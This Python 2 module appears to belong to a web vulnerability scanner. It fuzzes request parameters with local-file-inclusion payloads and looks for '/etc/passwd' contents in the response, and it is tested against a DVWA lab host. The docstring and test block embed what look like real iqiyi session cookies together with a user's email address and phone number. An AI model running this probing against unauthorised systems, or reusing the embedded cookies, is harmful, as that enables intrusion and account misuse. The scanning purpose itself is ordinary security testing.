#!/usr/bin/env python
#coding=utf-8

import requests
import copy
import urlparse
import urllib
import Queue
from config import *
from lib.common import *

"""
本地文件包含脚本
传入参数为字典型
    item =
"""

requests.packages.urllib3.disable_warnings()



def verify(task):
    """
    this function aim to detect if exists the local file include vulnerability
    :param: task, the request item, like
    {
        "method" : "GET",
        "url" : "http://api.t.iqiyi.com/feed/get_feed?uid=1409979958&authcookie=44zpCeNFgez79OVwz7GjJWVUaTN2m1bHxsQNLm306MVZm2m3ruh4Qm2w4SYwqDT9sDTos148d&device_id=mqaguvg2qatzipbhxzd2sbcxadxumaaz&agenttype=121&agentversion=6.0.46.4598&wallId=false&feedId=30267718948&version=1&praise=0&callback=jQuery17206312791961245239_1502178651908&_=1502178652025",
        "request_header" : {"Accept-Language": "en-US,en;q=0.8", "Accept-Encoding": "identity", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 Falcon/5.0.7.1", "Host": "api.t.iqiyi.com", "Referer": "http://paopaoquan.iqiyi.com/feed", "Cookie": "P00004=-898887952.1501743222.891ba158bb; QC008=1498535221.1501744345.1501744345.3; QC005=437b5f59bacf7103319dfd55207aba05; P00001=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00003=1408465522; P00010=1408465522; P01010=1501776000; P00007=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00PRU=1408465522; P00002=%7B%22uid%22%3A%221408465522%22%2C%22user_name%22%3A%2218510725391%22%2C%22email%22%3A%22xiaoyan_jia1%40163.com%22%2C%22nickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%2C%22pru%22%3A1408465522%2C%22type%22%3A11%2C%22pnickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%7D; P000email=xiaoyan_jia1%40163.com; QC160=%7B%22u%22%3A%2218510725391%22%2C%22lang%22%3Afalse%2C%22local%22%3A%7B%22name%22%3A%22%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86%22%2C%22init%22%3A%22Z%22%2C%22rcode%22%3A48%2C%22acode%22%3A%2286%22%7D%2C%22type%22%3A%22p%22%7D; QC911=%2Ca%2C; QC006=dvp8siolnl5z9noyqsawy4ke; Hm_lvt_53b7374a63c37483e5dd97d78d9bb36e=1501744707; _ga=GA1.2.2099195777.1501754894; __dfp=a03f42a0ff28c54146a475515ac6107716ac525722f5524a60655b7c247897c14e@1504346712080@1501754712080; T00404=bcd404d21b7724fa0b932f06b949a6b4; pps_client_ver2=6.0.46.4598", "Proxy-Connection": "keep-alive"},
        "request_content" : ''
    }

    :rtype: (True, message), if exits, return (True, message) else return (False, {})
    """
    message = {
        "method": "",
        "url" : "",
        "param" : "",
        "type" : "LFI",
        "info" : "[LFI]",
    }

    # define urlQueue
    anchor = "root:x:0"
    url = task["url"]
    headers = task['request_header']
    method = task['method']
    data = task['request_content'] if method == 'POST' else None

    hj = THTTPJOB(url, method=method, headers=headers, data=data)
    url_parse = urlparse.urlparse(url)
    # XSS里如果没有query字段，就在最后追加
    found = False
    if url_parse.query == "" and method == 'GET':
        pass
        # for key in XSS_Rule.keys():
        #     for payload in XSS_Rule[key]:
        #         _ = copy.deepcopy(task)
        #         tmp_url = url + payload
        #         _["url"] = tmp_url
        #         _["anchor"] = payload
        #         urlQueue.put(_)
        #         del _
    else:
        isjson = False
        if method == 'GET':
            query_string = hj.url.get_query
        else:
            if is_json(data):
                isjson = True
                query_string = urllib.urlencode(json.loads(data))
            else:
                query_string = data

        for rule_key in LFI_Rule:
            if found:
                break

            query_dict_list = Pollution(query_string, LFI_Rule[rule_key], isjson=isjson).payload_generate()
            for query_dict in query_dict_list:
                if found:
                    break
                #if method == 'GET':
                #    hj.url.get_dict_query = query_dict
                #else:
                #    if isjson:
                #        hj.data = json.dumps(query_dict)
                #    else:
                #        hj.data = urllib.urlencode(query_dict)
                hj.request_param_dict = query_dict

                status_code, headers, html, time_used = hj.request()
                if status_code == 200 and html.find(anchor) >= 0:
                    found = True
                    message['url'] = hj.response.url
                    message['method'] = hj.method
                    message['param'] = hj.data if hj.method == 'GET' else hj.url.get_query
                    break
    if found:
        save_to_databases(message)
        return (True, message)
    else:
        return (False, {})
    # generate payload

    # url = task["url"]
    # print "[poc_lfi] [task.url= {}]".format(url)
    # url_parse = urlparse.urlparse(url)
    # if task["method"] == "GET":
    #     # XSS里如果没有query字段，就在最后追加
    #     if url_parse.query == "":
    #         for key in LFI_Rule.keys():
    #             for payload in LFI_Rule[key]:
    #                 _ = copy.deepcopy(task)
    #                 tmp_url = url[0:url.rindex("/")+1] + payload
    #                 _["url"] = tmp_url
    #                 _["anchor"] = anchor
    #                 urlQueue.put(_)
    #                 del _
    #     else:
    #         query_dict = dict(urlparse.parse_qsl(url_parse.query))
    #         for query_key in query_dict.keys():
    #             # 每一个参数分别生成包含LFI payload的task
    #             for payload_key in LFI_Rule.keys():
    #                 for payload in LFI_Rule[payload_key]:
    #                     # lfi时选择直接替换参数值
    #                     tmp_query = ""
    #                     for in_key in query_dict.keys():
    #                         if in_key == query_key:
    #                             tmp_query += in_key + "=" +  payload
    #                         else:
    #                             tmp_query += in_key + "=" + query_dict[in_key]
    #                         tmp_query += "&"
    #                     tmp_query = tmp_query[:-1]
    #                     # 生成临时task变量
    #                     _ = copy.deepcopy(task)
    #                     _["anchor"] = anchor
    #                     _["url"] = url_parse.scheme + "://" + url_parse.netloc + url_parse.path + "?" + tmp_query
    #                     urlQueue.put(_)
    #                     del _
    # elif task["method"] == "POST":
    #     query = task["request_content"]
    #     if "{" in query and ":" in query and "}" in query:
    #         # how to judge if the payload is json?
    #         pass
    #     elif "multipart/form-data" in task["request_header"]["Content-Type"]:
    #         # pass the file upload
    #         pass
    #     else:
    #         try:
    #             post_content = task["request_content"]
    #             post_dict = dict(urlparse.parse_qsl(post_content))
    #             # direct replace is not correct,  if a=1%b=12 ,the result maybe a={}&b={}2
    #             for keys in post_dict:
    #                 tmp_post = ""
    #                 for payload_key in LFI_Rule.keys():
    #                     for payload in LFI_Rule[payload_key]:
    #                         for in_keys in post_dict:
    #                             if in_keys == keys:
    #                                 tmp_post += in_keys + "=" + payload
    #                             else:
    #                                 tmp_post += in_keys + "=" + post_dict[in_keys]
    #                             tmp_post += "&"
    #                         tmp_post = tmp_post[:-1]
    #                         _ = copy.deepcopy(task)
    #                         _["request_content"] = tmp_post
    #                         _["anchor"] = anchor
    #                         urlQueue.put(_)
    #                         del _
    #         except Exception as e:
    #             logger.error(repr(e))


    # # verify
    # found = False
    # while not urlQueue.empty():
    #     item = urlQueue.get()
    #     url = item["url"]
    #     headers = item["request_header"]
    #     try:
    #         logging.info("[+] [LFI_Forcelery] [FuzzLFI] [verify] Request:\t" + url)
    #         if item["method"] == "GET":
    #             req = requests.get(url, headers=headers, verify=False, allow_redirects=True, timeout=10)
    #         elif item["method"] == "POST":
    #             req = requests.post(url, data=item["request_content"], headers=headers, verify=False, allow_redirects=True, timeout=10)
    #         response = "".join(req.content.split("\n"))
    #         if item["anchor"] in response and req.status_code == 200:
    #             message["method"] = item["method"]
    #             message["url"] = url
    #             message["param"] = item["url"] if item["method"] == "GET" else item["request_content"]
    #             found = True
    #             break
    #     except Exception as e:
    #         logger.error(repr(e))

    # # clear the queue
    # while not urlQueue.empty():
    #     urlQueue.get()

    # if found:
    #     save_to_databases(message)
    #     return (True, message)
    # else:
    #     return (False, {})






if __name__ == '__main__':
    item = {
        "method" : "GET",
        "url" : "http://10.127.21.237/dvwa/vulnerabilities/fi/?page=include.php",
        "request_header" : {"Accept-Language": "en-US,en;q=0.8", "Accept-Encoding": "identity", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 Falcon/5.0.7.1", "Host": "api.t.iqiyi.com", "Referer": "http://paopaoquan.iqiyi.com/feed", "Cookie": "P00004=-898887952.1501743222.891ba158bb; QC008=1498535221.1501744345.1501744345.3; QC005=437b5f59bacf7103319dfd55207aba05; P00001=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00003=1408465522; P00010=1408465522; P01010=1501776000; P00007=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00PRU=1408465522; P00002=%7B%22uid%22%3A%221408465522%22%2C%22user_name%22%3A%2218510725391%22%2C%22email%22%3A%22xiaoyan_jia1%40163.com%22%2C%22nickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%2C%22pru%22%3A1408465522%2C%22type%22%3A11%2C%22pnickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%7D; P000email=xiaoyan_jia1%40163.com; QC160=%7B%22u%22%3A%2218510725391%22%2C%22lang%22%3Afalse%2C%22local%22%3A%7B%22name%22%3A%22%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86%22%2C%22init%22%3A%22Z%22%2C%22rcode%22%3A48%2C%22acode%22%3A%2286%22%7D%2C%22type%22%3A%22p%22%7D; QC911=%2Ca%2C; QC006=dvp8siolnl5z9noyqsawy4ke; Hm_lvt_53b7374a63c37483e5dd97d78d9bb36e=1501744707; _ga=GA1.2.2099195777.1501754894; __dfp=a03f42a0ff28c54146a475515ac6107716ac525722f5524a60655b7c247897c14e@1504346712080@1501754712080; T00404=bcd404d21b7724fa0b932f06b949a6b4; pps_client_ver2=6.0.46.4598", "Proxy-Connection": "keep-alive"},
        "request_content" : ''
    }
    item['request_header']['Cookie'] = 'security=low; PHPSESSID=blc0i03qp82vabd2q65ilnj4d3'

    a = verify(item)
    print a
